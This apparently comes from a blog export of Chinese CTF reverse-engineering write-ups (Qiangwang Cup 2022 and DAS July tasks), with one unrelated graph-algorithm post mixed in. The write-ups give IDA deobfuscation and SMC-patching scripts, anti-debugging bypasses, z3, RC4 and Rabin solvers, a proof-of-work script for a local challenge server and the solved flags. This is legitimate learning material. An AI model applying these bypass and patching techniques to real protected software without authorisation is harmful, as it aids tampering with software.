call进入的后是switch语句，再根据之前的赋值执行相应的操作 大概混肴逻辑是先赋值一个数，这个数决定了下面函数的操作，进入下面的call函数，执行相应的语句 trace记录debugger打开tracing window 在的打开view里面的tracing 然后点亮代码跟踪 但是在调试时候会有如下报错 1F7CF3464: got SIGTRAP signal (Trace trap) (exc.code 5, tid 8259) 正常调试是没用问题的，启用trace之后就会报错，这里设置一下ida调试debugger option 选择最下方edit exceptions 其他类似的报错也可如此，但是究其原理，类似是创造了一个死循环，有师傅懂得的话欢迎评论 参考： 常见反调试整理 (nigoule.com) Linux进程被信号杀死后退出状态码(exit code)的分析_halfclear的博客-CSDN博客_exitcode 例如移除时钟报错，有一种思路就是更换函数 1234移除alarm函数# 将程序名为ProgrammName中的alarm替换为isnan &gt;sed -i s/alarm/isnan/g ./ProgrammName 为了方便查看trace代码，这里还有一个垃圾循环我们可以修改一下 主要逻辑是产生了一个随机数后逻辑与0xFF，不断地比较。如果小于就自增一在继续判断，不断地循环直到和产生的随机数相等再推出循环。经过分析该循环体内没有需要的数据。我们可以直接patch跳转条件 或者在call完rand函数之后下一个不执行但是修改eax值的断点 然后我们就可以下断点trcace我们的代码 接着就可以分析相关的执行数据 例如这里就是我们的数据 以下类推可以得到最终的逻辑 或者我们可以写脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133from idc import *from capstone import *from keystone import *md = Cs(CS_ARCH_X86, CS_MODE_32)ks = Ks(KS_ARCH_X86, KS_MODE_32)def mydis(code, addr=0): for i in md.disasm(code, addr): return (&#x27;%s %s&#x27; %(i.mnemonic, i.op_str))def myasm(dis_txt, addr=0): #keystone fail encoding, count = ks.asm(dis_txt, addr=addr) return bytes(encoding)class Block: def __init__(self, start_ea, end_ea, imm, reg, call_target): self.start_ea = start_ea self.end_ea = end_ea self.imm = imm self.reg = reg self.call_target = call_targetregnums = []def get_block(start_ea): mnem_list = [&#x27;pushf&#x27;, &#x27;pusha&#x27;, &#x27;mov&#x27;, &#x27;call&#x27;, &#x27;pop&#x27;] ea = start_ea i = 0 while i &lt; 5: mnem = idc.print_insn_mnem(ea) if mnem_list[i%5] != mnem: raise 0 if mnem == &#x27;mov&#x27;: imm = idc.get_operand_value(ea, 1) # 17 -&gt; cl, 18 -&gt; dl, 19 -&gt; bl reg = idc.get_operand_value(ea, 0) #reg_id &#x27;&#x27;&#x27; if reg not in regnums: print (&#x27;reg=%s, ea=%x&#x27; %(reg, ea)) regnums.append(reg) &#x27;&#x27;&#x27; if mnem == &#x27;call&#x27;: call_target = idc.get_operand_value(ea, 0) i += 1 ea += idc.get_item_size(ea) return Block(start_ea, ea, imm, reg, call_target)def check_mnem(ea, should_mnem): mnem = idc.print_insn_mnem(ea) if mnem != should_mnem: assert 0def get_real_code(block, new_code, new_code_ea): ea = block.call_target while True: mnem = idc.print_insn_mnem(ea) if mnem == &#x27;cmp&#x27;: reg = idc.get_operand_value(ea, 0) imm = idc.get_operand_value(ea, 1) if (reg == block.reg) &amp; (imm == block.imm): break ea += idc.get_item_size(ea) ea += idc.get_item_size(ea) check_mnem(ea, &#x27;jnz&#x27;) ea += idc.get_item_size(ea) check_mnem(ea, &#x27;popa&#x27;) ea += idc.get_item_size(ea) check_mnem(ea, &#x27;popf&#x27;) ea += idc.get_item_size(ea) mnem = idc.print_insn_mnem(ea) if mnem == &#x27;pushf&#x27;: print (&#x27;find ret: ea=%x&#x27; %ea) new_code += myasm(&#x27;ret&#x27;, new_code_ea+len(new_code)) return True, new_code while True: mnem = idc.print_insn_mnem(ea) if mnem == &#x27;jmp&#x27;: break dis = mydis(idc.get_bytes(ea, idc.get_item_size(ea)), ea) print (&#x27;block=%x, ea=%x, dis=%s&#x27; %(block.start_ea, ea, dis)) new_code += myasm(dis, new_code_ea+len(new_code)) ea += idc.get_item_size(ea) return False, new_codedef handle_one_fun(fun_start, new_code_ea): ea = fun_start new_code = b&#x27;&#x27; while True: mnem = idc.print_insn_mnem(ea) if mnem != &#x27;pushf&#x27;: dis = mydis(idc.get_bytes(ea, idc.get_item_size(ea)), ea) print(&#x27;ea=%x, dis=%s&#x27; % (ea, dis)) new_code += myasm(dis, new_code_ea + len(new_code)) if mnem == &#x27;retn&#x27;: break ea += idc.get_item_size(ea) else: print (&#x27;get_block ea=%x&#x27; %ea) myblock = get_block(ea) #print (&#x27;ea=%x, new_ea=%x&#x27; %(myblock.start_ea, new_code_ea+len(new_code))) ret, new_code = get_real_code(myblock, new_code, new_code_ea) if ret: break ea = myblock.end_ea return new_codenew_code_start = 0x96150ida_bytes.patch_bytes(new_code_start, b&#x27;\\x90&#x27;*0x10000)for i in range(0x10000): idc.del_items(i+new_code_start)funs = [0x48F4, 0x48c8, 0x3fbf, 0x3F1B, 0x4148, 0x750A9, 0x33EC]new_code_ea = new_code_startfor fun in funs: print (&#x27;--------------------------------&#x27;) print (&#x27;fun=%x, new_fun=%x&#x27; %(fun, new_code_ea)) print (&#x27;--------------------------------&#x27;) new_code = handle_one_fun(fun, new_code_ea) ida_bytes.patch_bytes(new_code_ea, new_code) idc.create_insn(new_code_ea) ida_funcs.add_func(new_code_ea) new_code_ea += len(new_code) 最后z3求解 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889from z3 import *flag = [BitVec(&#x27;x%d&#x27; % i, 8) for i in range(28)]s = Solver()v5 = 40085 * flag[3]- 222506 * flag[2]+ 54507 * flag[4]+ 88056 * flag[1]+ 212571 * flag[5]- 160722 * flag[0]-0x6A31Ds.add(v5==0)v5 = 49300 * flag[3]+ 259229 * flag[0]+ 278066 * flag[2]- 127937 * flag[1]- 295169 * flag[4]- 8368677s.add(v5==0)v5 = 42214 * flag[1]- 108025 * flag[3]+ 205972 * flag[0]+ 27559 * flag[2]- 17114904s.add(v5==0)v5 = - 151496 * flag[1]+ 204740 * flag[0]+ 80143 * flag[2]- 12295783s.add(v5==0)v5 = 241935 * flag[1]+ 124128 * flag[0]- 38790036+ 273221 * flag[0]- 27868542s.add(v5==0)v6 = -279656 * flag[2]- 199574 * flag[1]- 258130 * flag[8]- 200399 * flag[3]- 173903 * flag[7]+ 175816 * flag[0]- 234569 * flag[6]- 108273 * flag[4]- 222957 * flag[5]+ 128244179s.add(v6==0)v6 = - 81541 * flag[1]- 268763 * flag[0]+ 219073 * flag[3]+ 34782 * flag[6]+ 21153 * flag[5]+ 173005 * flag[7]+ 76285 * flag[4]+ 32825 * flag[2]- 13874925s.add(v6==0)v6 = 85214 * flag[2]- 268299 * flag[3]- 230981 * flag[1]+ 290772 * flag[5]- 74394 * flag[4]+ 28044 * flag[6]- 242995 * flag[0]+ 50871139s.add(v6==0)v7 = -208564 * flag[0] + 81934 * flag[9] - 106641 * flag[7] + 198477 * flag[2] + 154505 * flag[1] + 48440 * flag[5] - 149004 * flag[3] - 108909 * flag[4] - 51714 * flag[10] - 296420 * flag[8] + 263021 * flag[6] + 688726 s.add(v7==0)v7 = - 131130 * flag[2] + 224265 * flag[3] + 230702 * flag[0] - 176285 * flag[7] - 274778 * flag[4] + 103848 * flag[8] - 136039 * flag[9] - 241151 * flag[5] + 15542 * flag[6] - 17521 * flag[1] + 41644083s.add(v7==0)v8 = 195056 * flag[4]- 15717 * flag[9]- 180214 * flag[6]- 114427 * flag[5]+ 277782 * flag[7]+ 261379 * flag[8]- 225266 * flag[2]+ 107609 * flag[0]+ 259792 * flag[3]+ 270563 * flag[11]+ 205124 * flag[1]+ 138334 * flag[10]+ 103474 * flag[12]- 117027475s.add(v8==0)v8 = 189573 * flag[8]+ 64393 * flag[6]+ 231137 * flag[1]+ 145315 * flag[4]- 53938 * flag[10]- 291345 * flag[5]+ 216413 * flag[3]- 204681 * flag[0]- 65519 * flag[9]- 262826 * flag[2]+ 187002 * flag[7]+ 271732 * flag[11]- 38663722s.add(v8==0)v9 = 15645 * flag[13] + 276267 * flag[12] + 31190 * flag[5] - 244002 * flag[2] + 81415 * flag[3] - 22940 * flag[10] - 126076 * flag[7] + 8932 * flag[8] + 112153 * flag[4] + 194218 * flag[11] + 197656 * flag[9] - 204463 * flag[0] - 219500 * flag[1] + 19777 * flag[6] - 24531260s.add(v9==0)v10 = 279969 * flag[8]- 123977 * flag[4]+ 162094 * flag[0]- 215769 * flag[1]- 18878 * flag[14]- 80292 * flag[11]- 237675 * flag[5]- 222121 * flag[6]+ 269381 * flag[12]+ 153934 * flag[13]- 165380 * flag[10]- 157137 * flag[2]- 186748 * flag[3]+ 170756 * flag[7]- 186932 * flag[9]+ 87264470s.add(v10==0)v11 = -87190 * flag[2]- 74836 * flag[1]+ 16892 * flag[9]- 185781 * flag[8]- 12726 * flag[7]+ 85022 * flag[12]+ 232989 * flag[10]+ 68516 * flag[0]- 120254 * flag[6]- 204892 * flag[5]- 65901 * flag[4]- 201087 * flag[13]+ 158612 * flag[11]- 49445 * flag[3]- 181860 * flag[14]- 111015 * flag[15]+ 43646834s.add(v11==0)v12 = -170184 * flag[3] - 137671 * flag[4] - 85374 * flag[9] - 73658 * flag[11] + 230891 * flag[13] + 54346 * flag[15] - 280694 * flag[0] + 60411 * flag[2] + 27171 * flag[7] - 50618 * flag[6] + 11843 * flag[10] + 131778 * flag[5] + 13956 * flag[8] - 42562 * flag[12] - 19972 * flag[1] - 145797 * flag[14] - 58717 * flag[16] + 74613584s.add(v12==0)v13 = 242475 * flag[16]- 234385 * flag[0]+ 124653 * flag[2]- 287929 * flag[13]- 190916 * flag[12]- 277578 * flag[11]+ 39 * flag[8]- 41625 * flag[6]+ 67262 * flag[5]- 250144 * flag[9]- 70886 * flag[10]- 223492 * flag[15]- 179651 * flag[7]+ 206538 * flag[17]+ 161965 * flag[3]- 146258 * flag[4]+ 167068 * flag[1]+ 196330 * flag[14]+ 76353817s.add(v13==0)v14 = 29700 * flag[18]- 60542 * flag[5]+ 274107 * flag[11]+ 154914 * flag[13]- 143185 * flag[12]+ 167424 * flag[2]+ 137439 * flag[8]- 186151 * flag[10]- 77157 * flag[9]- 233090 * flag[6]- 27400 * flag[7]- 76557 * flag[15]- 108002 * flag[17]+ 103161 * flag[14]- 133956 * flag[1]- 219502 * flag[4]- 202897 * flag[0]- 250957 * flag[3]- 119297 * flag[16]+ 100812197s.add(v14==0)v15 = -171971 * flag[9]+ 38740 * flag[4]+ -31661 * flag[10]+ -194653 * flag[18]+ -295910 * flag[16]+ 136489 * flag[12]+ 212619 * flag[17]+ 165592 * flag[11]+ 211791 * flag[1]+ 156909 * flag[2]+ -232187 * flag[8]+ -73709 * flag[7]+ 79735 * flag[14]+ 184882 * flag[13]+ 111105 * flag[6]+ 148840 * flag[3]+ -35774 * flag[19]+ -275711 * flag[0] + 135265 * flag[5] - 141221 * flag[15] - 39117122s.add(v15==0)v16 = -186514 * flag[17]+ -7791 * flag[2]+ 276755 * flag[11]+ -294815 * flag[14]+ -238763 * flag[15]+ -146099 * flag[5]+ 184977 * flag[16]+ 178413 * flag[1]+ 287303 * flag[3]+ -71946 * flag[10]+ -73771 * flag[9]+ -129032 * flag[18]+ 200202 * flag[20]+ -150509 * flag[6]+ -156625 * flag[13]+ 14093 * flag[7]+ 192584 * flag[12]- 122770 * flag[0]- 255494 * flag[8] + 65 * flag[4] - 108479 * flag[19] + 13521895s.add(v16==0)v17 = 210978 * flag[7]+ 300336 * flag[10]+ 207254 * flag[15]+ 216206 * flag[5]+ -63529 * flag[0]+ -274903 * flag[11]+ -10750 * flag[14]+ 25008 * flag[4]+ -100942 * flag[19]+ -104857 * flag[2]+ 266501 * flag[8]+ 229070 * flag[17]+ -234559 * flag[16]+ 298459 * flag[3]+ -172052 * flag[6]+ -98938 * flag[12]+ 66155 * flag[13]+ -84761 * flag[1]+ -283508 * flag[18]+ 288577 * flag[21] - 75407 * flag[20] - 204447 * flag[9] + 4351595s.add(v17==0)v18 = -201846 * flag[14]+ 272550 * flag[20]+ 60398 * flag[6]+ 45580 * flag[7]+ 195108 * flag[11]+ 38596 * flag[0]+ 220445 * flag[18]+ -190873 * flag[15]+ 103477 * flag[9]+ 118842 * flag[19]+ 206336 * flag[10]+ -249940 * flag[17]+ -48084 * flag[21]+ 104901 * flag[5]+ -48576 * flag[4]+ 287104 * flag[16]+ -286686 * flag[1]+ -30253 * flag[22]+ 121183 * flag[3]+ 90967 * flag[2]+ -195519 * flag[12] - 129304 * flag[8] + 141188 * flag[13] - 56642147s.add(v18==0)v19 = 110609 * flag[4]+ 5913 * flag[21]+ -197578 * flag[7]+ 45127 * flag[18]+ 282426 * flag[13]+ -71019 * flag[16]+ -6980 * flag[11]+ 208216 * flag[15]+ -13544 * flag[20]+ 17852 * flag[8]+ 167833 * flag[12]+ 145568 * flag[17]+ 3610 * flag[19]+ 91985 * flag[1]+ -267402 * flag[5]+ -32355 * flag[14]+ -197823 * flag[23]+ 135525 * flag[2]+ -229424 * flag[22]+ 38093 * flag[10]+ 50167 * flag[6]+ 118713 * flag[9] + 123874 * flag[0] - 89499 * flag[3] - 43090537s.add(v19==0)v1 = -164755 * flag[9] + 175470 * flag[8] - 28660 * flag[1] + 7217 * flag[11] - 295102 * flag[4] - 28531 * flag[19] - 106265 * flag[25] - 92750 * flag[10] + 16738 * flag[21] - 231714 * flag[6] + 172042 * flag[24] - 215890 * flag[17] + 199697 * flag[12] - 84235 * flag[7] + 44614 * flag[13] + 75104 * flag[5] - 195843 * flag[0] - 15784 * flag[14] - 131950 * flag[15] - 268167 * flag[16] - 197565 * flag[20] + 24340 * flag[23] + 105130 * flag[2] - 79750 * flag[22] - 264668 * flag[3] + 50329 * flag[18] + 137774797s.add(v1==0)v20 = 62119 * flag[17]- 17215 * flag[24]+ 289621 * flag[18]+ 53006 * flag[20]+ 95969 * flag[11]+ 202404 * flag[0]+ 247060 * flag[21]+ 144211 * flag[19]+ 280106 * flag[7]- 126431 * flag[10]- 226837 * flag[12]+ 10463 * flag[23]+ 121257 * flag[13]- 84190 * flag[9]+ 88917 * flag[1]+ 15453 * flag[14]+ 271442 * flag[4]+ 110851 * flag[3]- 231422 * flag[5]+ 176741 * flag[22]+ 266134 * flag[2]- 197327 * flag[6]- 55225 * flag[8] - 265465 * flag[15] + 119612 * flag[16] - 98514358s.add(v20==0)v2 = 151924 * flag[25] - 265311 * flag[6] + 107604 * flag[11] - 47851 * flag[24] + 227178 * flag[13] - 162699 * flag[2] + 2171 * flag[20] + 211070 * flag[23] + 94815 * flag[22] + 124760 * flag[16] + 41462 * flag[19] - 277022 * flag[15] - 62501 * flag[26] - 17727 * flag[14] - 257908 * flag[4] - 175112 * flag[21] + 8972 * flag[10] - 71801 * flag[8] - 114724 * flag[5] - 252898 * flag[9] + 161457 * flag[1] - 64461 * flag[0] - 111493 * flag[18] + 200145 * flag[17] - 290075 * flag[3] + 158466 * flag[12]v21 = v2 - 275262 * flag[7] + 86899519s.add(v21==0)v3 = 142850 * flag[18]- 166704 * flag[1]+ 284852 * flag[22]+ 248972 * flag[7]- 76200 * flag[17]+ 261708 * flag[19]+ 91911 * flag[24]+ 22347 * flag[3]+ 76006 * flag[21]+ 256511 * flag[6]- 100052 * flag[14]- 115830 * flag[2]- 93202 * flag[23]+ 248858 * flag[12]- 262669 * flag[10]+ 67895 * flag[5]- 111771 * flag[8]- 132193 * flag[11]- 141512 * flag[13]+ 139406 * flag[27]+ 109646 * flag[16]- 286309 * flag[9]+ 175476 * flag[15] + 138067 * flag[20] + 192825 * flag[25]s.add(flag[0] == 102)s.add(flag[1] == 108)s.add(flag[2] == 97)s.add(flag[3] == 103)s.add(flag[4] == 123)s.add(flag[27] == 125)s.add(199577 * flag[0] - 63091 * flag[4] + v3 - 285207 * flag[26] - 58820340 + v21 == 0)print(s.check())print(s.model())mod = s.model()print(&#x27;&#x27;.join([chr(mod[x].as_long()) for x in flag])) easyre首先来卡一下main函数 finger识别一下函数 fork函数在主进程返回的是子进程的PID，在子进程返回的是0，这里生成一个re3的文件 ptrace函数深入分析 - 黑箱 - 博客园 (cnblogs.com) 这里的ptrace比较重要代表不同的类型 光标在第一个参数上按M，搜索 ptrace，就可以得到相应的参数。 进入401f2f函数 4017e5函数，有一大串数据 似乎是对子进程进行了一些操作，我们去看看之前的re3文件 Int setjmp(jmp_buf env); ​ 返回值：若直接调用则返回0，若从longjmp调用返回则返回非0值的longjmp中的val值 Void longjmp(jmp_buf env,int val); ​ 调用此函数则返回到语句setjmp所在的地方，其中env 就是setjmp中的 env，而val 则是使setjmp的返回值变为val。 这里的loc_21F9是重要逻辑，跟进，看到一个int3，这里发出中断信号，等待主处理进程，然后主进程判断异常类型（这就是后面的值），然后执行smc操作，也照应了之前的wait函数。 下面我们再回到主进程分析一下smc 带参数启动调试。 主要smc逻辑 我们运用断点把数据提取出来 12345678910xorKey = &#123;8723: 2533025110152939745, 8739: 5590097037203163468, 8755: 17414346542877855401, 8771: 17520503086133755340, 8787: 12492599841064285544, 8803: 12384833368350302160, 8819: 11956541642520230699, 8835: 12628929057681570616, 8851: 910654967627959011, 8867: 5684234031469876551, 8883: 6000358478182005051, 8899: 3341586462889168127, 8915: 11094889238442167020, 8931: 17237527861538956365, 8947: 17178915143649401084, 8963: 11176844209899222046, 8979: 18079493192679046363, 8995: 7090159446630928781, 9011: 863094436381699168, 9027: 6906972144372600884, 9043: 16780793948225765908, 9059: 7086655467811962655, 9075: 13977154540038163446, 9091: 7066662532691991888, 9107: 15157921356638311270, 9123: 12585839823593393444, 9139: 1360651393631625694, 9155: 2139328426318955142, 9171: 2478274715212481947, 9187: 12876028885252459748, 9203: 18132176846268847269, 9219: 17242441603067001509, 9235: 8492111998925944081, 9251: 14679986489201789069, 9267: 13188777131396593592, 9283: 5298970373130621883, 9299: 525902164359904478, 9315: 2117701741234018776, 9331: 9158760851580517972&#125;addr = 0x2213while True: data = get_qword(addr) key = xorKey[addr] dec = data ^ key idc.patch_qword(addr, dec) addr += 16 之后跑脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384_BYTE *__fastcall sub_21F9(__int64 a1, __int64 a2, __int64 a3)&#123; _BYTE *result; // rax int v4; // [rsp+20h] [rbp-28h] int v5; // [rsp+24h] [rbp-24h] char v6; // [rsp+28h] [rbp-20h] int v7; // [rsp+2Ch] [rbp-1Ch] int j; // [rsp+30h] [rbp-18h] int v9; // [rsp+34h] [rbp-14h] int v10; // [rsp+38h] [rbp-10h] char v11; // [rsp+3Ch] [rbp-Ch] int v12; // [rsp+40h] [rbp-8h] int i; // [rsp+44h] [rbp-4h] __debugbreak(); for ( i = 0; i &lt;= 24; ++i ) &#123; v12 = 0; v11 = 0; v10 = 0; v9 = 1; while ( v12 &lt;= 24 ) &#123; if ( *(_BYTE *)(25 * i + v12 + a1) ) &#123; ++v11; v10 = 1; &#125; else &#123; if ( v10 ) &#123; *(_BYTE *)(a2 + 25LL * i + v9) = v11; v11 = 0; ++v9; &#125; v10 = 0; &#125; if ( ++v12 == 25 &amp;&amp; v10 ) &#123; *(_BYTE *)(a2 + 25LL * i + v9) = v11; v11 = 0; ++v9; &#125; &#125; result = (_BYTE *)(25LL * i + a2); *result = v9 - 1; &#125; for ( j = 0; j &lt;= 24; ++j ) &#123; v7 = 0; v6 = 0; v5 = 0; v4 = 1; while ( v7 &lt;= 24 ) &#123; if ( *(_BYTE *)(25 * v7 + j + a1) ) &#123; ++v6; v5 = 1; &#125; else &#123; if ( v5 ) &#123; *(_BYTE *)(a3 + 25LL * j + v4) = v6; v6 = 0; ++v4; &#125; v5 = 0; &#125; if ( ++v7 == 25 &amp;&amp; v5 ) &#123; *(_BYTE *)(a3 + 25LL * j + v4) = v6; v6 = 0; ++v4; &#125; &#125; result = (_BYTE *)(25LL * j + a3); *result = v4 - 1; &#125; __debugbreak(); return result;&#125; 是一个数织游戏 于是很明显我们RE3的主函数的对比数据不对，于是这时候就去init段还有个preinit段找 同样的手法是通过偏移来进行了混淆，手动计算即可，最后拿到真实数据 然后用网站解密 Nonogram (handsomeone.github.io) 还有一种动态调试： 强网杯2022-Reverse-easyre wp","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[{"name":"linux反调试","slug":"linux反调试","permalink":"http://example.com/tags/linux%E5%8F%8D%E8%B0%83%E8%AF%95/"}],"keywords":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}]},{"title":"搜索与图论","slug":"搜索与图论","date":"2022-07-25T16:00:00.000Z","updated":"2022-07-26T07:49:56.038Z","comments":true,"path":"2022/07/26/搜索与图论/","link":"","permalink":"http://example.com/2022/07/26/%E6%90%9C%E7%B4%A2%E4%B8%8E%E5%9B%BE%E8%AE%BA/","excerpt":"","text":"树与图的存储树是一种特殊的图，与图的存储方式相同。对于无向图中的边ab，存储两条有向边a-&gt;b, b-&gt;a。因此我们可以只考虑有向图的存储。 (1) 邻接矩阵：g[a][b] 存储边a-&gt;b (2) 邻接表： 123456789101112// 对于每个点k，开一个单链表，存储k所有可以走到的点。h[k]存储这个单链表的头结点int h[N], e[N], ne[N], idx;// 添加一条边a-&gt;bvoid add(int a, int b)&#123; e[idx] = b, ne[idx] = h[a], h[a] = idx ++ ;&#125;// 初始化idx = 0;memset(h, -1, sizeof h); DFS12345678910int dfs(int u)&#123; st[u] = true; // st[u] 表示点u已经被遍历过 for (int i = h[u]; i != -1; i = ne[i]) &#123; int j = e[i]; if (!st[j]) dfs(j); &#125;&#125; BFS12345678910111213141516171819queue&lt;int&gt; q;st[1] = true; // 表示1号点已经被遍历过q.push(1);while (q.size())&#123; int t = q.front(); q.pop(); for (int i = h[t]; i != -1; i = ne[i]) &#123; int j = e[i]; if (!st[j]) &#123; st[j] = true; // 表示点j已经被遍历过 q.push(j); &#125; &#125;&#125;","categories":[{"name":"算法","slug":"算法","permalink":"http://example.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[],"keywords":[{"name":"算法","slug":"算法","permalink":"http://example.com/categories/%E7%AE%97%E6%B3%95/"}]},{"title":"DAS七月赛","slug":"DAS七月赛","date":"2022-07-25T06:23:13.740Z","updated":"2022-07-25T12:13:57.502Z","comments":true,"path":"2022/07/25/DAS七月赛/","link":"","permalink":"http://example.com/2022/07/25/DAS%E4%B8%83%E6%9C%88%E8%B5%9B/","excerpt":"","text":"隐秘的角落加密后的数据在init函数有异或0x23的操作，是rc4加密 12345678910111213141516171819202122232425262728293031323334import base64def rc4_main(key, message): s_box = rc4_init_sbox(key) crypt = rc4_excrypt(message, s_box) return cryptdef rc4_init_sbox(key): s_box = list(range(256)) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] return s_boxdef rc4_excrypt(plain, box): res = [] i = j = 0 for s in plain: i = (i + 1) % 256 j = (j + box[i]) % 256 box[i], box[j] = box[j], box[i] t = (box[i] + box[j]) % 256 k = box[t] res.append(chr(s ^ k)) for i in range (len(res)): print(res[i],end=&#x27;&#x27;) return res#a=[0xE0,0xB2,0x5F,0x3D,0x8F,0xFA,0x94,0xB6,0xE7,0x9D,0x6C,0x98,0x66,0xD2,0x0F,0xEA,0x6D,0x6F,0xBE,0xC5,0x71,0x40,0x08,0x1B,0xF6,0xF3,0xBD,0xA8,0x8D,0x09,0x7B,0x7C]a = [251, 198, 166, 157, 196, 219, 123, 86, 182, 70, 166, 192, 133, 100, 122, 154, 55, 76, 16, 150, 233, 167, 40, 196, 177, 45, 241, 222, 71, 59, 181, 243, 44, 125, 103, 29]rc4_main(&quot;thisiskkk&quot;,a) 得到56e83694-f976-11eb-b343-faffc201c8e0 再md5加密小写就是flag ezGogo题一些陌生的函数以及奇怪的变量配合动调体验更加 这里的循环的作用主要是把输入的40个字符的ASCII码拼接成一个大整数 然后就是平方取余比较 加密就是如下$$c&#x3D;m^2modn$$一种特殊的RSA加密形式，用rabnin算法解 用yafu分解大质数，可以发现这两个质数都是模四余三，根据e&#x3D;2可知，这是一个rabin算法。 12345678910111213141516171819202122import libnumimport gmpy2#导入公钥n=131453094564548508772284336424680998857035326273571981446094083416917514535349876760437096547435610190391556347148927592380050533193934285571983556924577144473815598516557161e = 2c=33529281532734294938614341047870321616766628114182320093600990983456360122704185955921012051918080449587733939007294096845300395098833835443815283246602601870001850089370636#n 在线分解p=17489158711316178659q=7516261744453902635364442762653073356746063224482072262455102025715350278471780391042196223686233375846890331396948280463168691132631674699134296333350979inv_p = gmpy2.invert(p, q)inv_q = gmpy2.invert(q, p)mp = pow(c, (p + 1) // 4, p)mq = pow(c, (q + 1) // 4, q)a = (inv_p * p * mq + inv_q * q * mp) % nb = n - int(a)c = (inv_p * p * mq - inv_q * q * mp) % nd = n - int(c)#因为rabin 加密有四种结果，全部列出。aa=[a,b,c,d]for i in aa: # print(i) print(libnum.n2s(int(i))) 得到flag：DASCTF{48fa8aa2b489e9adac1750ea16ddc7b5} fantansic maze sha256爆破 自动化路径求解 bfs算法 首先是常规的sha256爆破 过了proof之后题目会给出远程程序的base64编码，将编码解码后写入文本再拖入IDA查看 其中有1000个相似的函数，其汇编代码大致如下(这里IDA F5看不出来啥东西) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556.text:0000000000001358 function_0 proc near ; CODE XREF: function_36+85↓p.text:0000000000001358 ; function_201+67↓p ....text:0000000000001358 ; __unwind &#123;.text:0000000000001358 endbr64.text:000000000000135C push rbp.text:000000000000135D mov rbp, rsp.text:0000000000001360 sub rsp, 10h.text:0000000000001364 mov eax, cs:tmp.text:000000000000136A add eax, 1.text:000000000000136D mov cs:tmp, eax.text:0000000000001373 lea rdi, aStep1 ; &quot;step1:&quot;.text:000000000000137A call sub_10C0.text:000000000000137F mov eax, 0.text:0000000000001384 call read_num.text:0000000000001389 mov [rbp-4], eax.text:000000000000138C cmp dword ptr [rbp-4], 0Ah.text:0000000000001390 ja loc_141E.text:0000000000001396 mov eax, [rbp-4].text:0000000000001399 lea rdx, ds:0[rax*4].text:00000000000013A1 lea rax, unk_3501C.text:00000000000013A8 mov eax, [rdx+rax].text:00000000000013AB cdqe.text:00000000000013AD lea rdx, unk_3501C.text:00000000000013B4 add rax, rdx.text:00000000000013B7 db 3Eh.text:00000000000013B7 jmp rax.text:00000000000013BA ; ---------------------------------------------------------------------------.text:00000000000013BA mov eax, 0.text:00000000000013BF call function_541.text:00000000000013C4 mov eax, 0.text:00000000000013C9 call function_205.text:00000000000013CE mov eax, 0.text:00000000000013D3 call function_297.text:00000000000013D8 mov eax, 0.text:00000000000013DD call function_175.text:00000000000013E2 mov eax, 0.text:00000000000013E7 call function_331.text:00000000000013EC mov eax, 0.text:00000000000013F1 call function_287.text:00000000000013F6 mov eax, 0.text:00000000000013FB call function_938.text:0000000000001400 mov eax, 0.text:0000000000001405 call function_413.text:000000000000140A mov eax, 0.text:000000000000140F call function_934.text:0000000000001414 mov eax, 0.text:0000000000001419 call function_1000.text:000000000000141E.text:000000000000141E loc_141E: ; CODE XREF: function_0+38↑j.text:000000000000141E mov eax, 0.text:0000000000001423 call main.text:0000000000001428 nop.text:0000000000001429 leave.text:000000000000142A retn.text:000000000000142A ; &#125; // starts at 1358.text:000000000000142A function_0 endp 转换为伪代码大致如下 123456789tmp++;switch(read_num())&#123; case &quot;1&quot;: function_541(); case &quot;2&quot;: function_205(); ..... case &quot;10&quot; function_1000(); default: main();&#125; 从function_0 ~ function_999都能跳转到其它的十个函数，我们的目标是要在第1000步的时候走到function_1000从而获得flag 但是这里可以发现在每一个switch内只要default就会返回main函数，那么我们其实只需要找到一条长度小于1000的路径，然后一直default去填充tmp就好了 寻找最短路径可以采用bfs算法，那我们只需要知道1000个函数每个函数可以跳转到那些函数就好了，但是由于每一次的maze都是随机生成的且超过20秒就会直接Alarm clock,所以我们不能通过IDA来直观的得知程序的构造，而是需要我们手动分析hex view来得到程序的构造 分析Hex View主要分析的就是call指令 call指令占5个字节,如00000000000013BF call function_541 在 Hex View 中为\\x00\\x01\\xbd\\x7b\\xe8(这里为大端序), \\xe8可以理解为标志位,\\x00\\x01\\xbd\\x7b为地址到跳转函数的00000000000013BF偏移,而这里每一个函数的偏移为0xd3，这里就可以通过偏移来算出call指令所指向的函数 这里得注意下这里得偏移是有符号数，所以在计算的时候需要将其转换 最后，在得到表之后，用bfs算法得到路径，最后得到flag 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103#!/usr/bin/python3from pwn import *import randomimport sysfrom hashlib import sha256p = remote(&quot;127.0.0.1&quot;,1447)def pass_proof(): dir = string.ascii_letters + string.digits #生成24个字母和十个数 p.recvuntil(&#x27;[+] sha256(XXXX+&#x27;) salt = p.recv(16).strip().decode()#strip() 方法用于移除字符串头尾指定的字符（/n) #decode() 方法以 encoding 指定的编码格式解码字符串。默认编码为字符串编码。 p.recvuntil(&#x27;) == &#x27;) hash = p.recv(64).strip().decode() while True: rand_str = (&#x27;&#x27;.join([random.choice(dir) for _ in range(4)])) + salt if sha256(rand_str.encode()).hexdigest() == hash: print(rand_str[:4]) p.sendlineafter(&#x27;[+] Plz Tell Me XXXX :&#x27;, rand_str[:4]) breakdef get_elf(): p.recvuntil(&quot;map :\\n&quot;) data=p.recvuntil(&#x27;That\\&#x27;s all\\n&#x27;,drop=True)[:-1] data=base64.b64decode(data) fd=open(&#x27;pwnpwn&#x27;,&#x27;wb&#x27;) fd.write(data) fd.close()pass_proof()get_elf()fd = open(&quot;./pwnpwn&quot;,&quot;rb&quot;)offset = 0x13C0def get_map(fd,offset): Map = [] for i in range(1000): addr = 